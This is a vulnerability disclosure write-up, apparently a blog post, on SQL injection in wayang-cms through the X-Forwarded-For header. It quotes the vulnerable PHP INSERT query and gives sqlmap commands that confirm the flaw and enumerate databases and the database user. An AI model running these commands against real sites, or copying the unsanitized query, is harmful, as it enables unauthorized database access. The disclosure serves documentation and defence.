wayang-cms SQL injection vulnerability
---
### 1.wayang-cms official download address
Github official download，[wayang-cms](https://github.com/ketutd/wayang-cms)
### 2.Build a recurring environment
Download and install phpStudy, download wayang-cms and copy all files inside to phpStudy's web directory, connect to mysql and create a new database wayang-cms, start Apache to access `http://127.0.0.1/wy_install/` set up installation. After the installation is complete, import cms.sql in wy_install into the database, and the successful operation is as follows
![](https://lowliness9.github.io/post-images/1605356351107.png)
### 3.Vulnerability analysis
The reason for the vulnerability is that the system did not perform any security verification on the visitor's IP address when recording the visitor's IP, and directly spliced the data passed by the user into the SQL statement for execution. The location of the vulnerability is in lines 8 to 10 of `wy_controlls/wy_side_visitor.php`. In line 8 of the code, the IP address, browser, time, etc. of the user accessing the system are spliced with SQL statements using the `Insert` keyword. The code uses the ip() method to obtain the visitor's IP address.
![](https://lowliness9.github.io/post-images/1605352424803.png)
Locate the file of the ip() method to view the specific implementation. This method is located in `wy_controlls/wy_side_visitor.php`. You can see through the code that if there are fields such as X-Forwarded-For in the HTTP request header, it will be taken directly from the HTTP request header Value and return.
![](https://lowliness9.github.io/post-images/1605352606597.png)
Attackers can submit dirty data for malicious SQL injection.
```php
$queryi="INSERT INTO `wy_visitor`(`visitor_ipaddress`, `visitor_user_agent`, `visitor_date`, `visitor_online`, `visitor_online_status`) 
  VALUES ('".ip()."','".$browser."',CURDATE(),CURRENT_TIMESTAMP,1) ON DUPLICATE KEY UPDATE `visitor_online`=CURRENT_TIMESTAMP, `visitor_online_status`=1";
$row=$conn->query($queryi);
```
### 4.Vulnerability proof
The tools used are sqlmap and burpsuite. Visit the homepage of the website and capture the package, and add the X-Forwarded-For: 8.8.8.8 field, and add the \* sign after 8.8.8.8 for the purpose of allowing sqlmap to identify the injection point.
![](https://lowliness9.github.io/post-images/1605354299986.png)
Save the data package as vul.txt and use sqlmap to verify, execute the following command.
```
python2 sqlmap.py -r vul.txt --batch -v 3 --risk 3 --level 5 
```
![](https://lowliness9.github.io/post-images/1605354487105.png)
Try to get the database name of the system
```
python2 sqlmap.py -r vul.txt --batch -v 3 --risk 3 --level 5 --dbs
```
![](https://lowliness9.github.io/post-images/1605354592521.png)
Try to get the current user of the database
```
python2 sqlmap.py -r vul.txt --batch -v 3 --risk 3 --level 5 --current-user
```
![](https://lowliness9.github.io/post-images/1605355125688.png)
It is found through testing that the vulnerability exists and can be exploited.

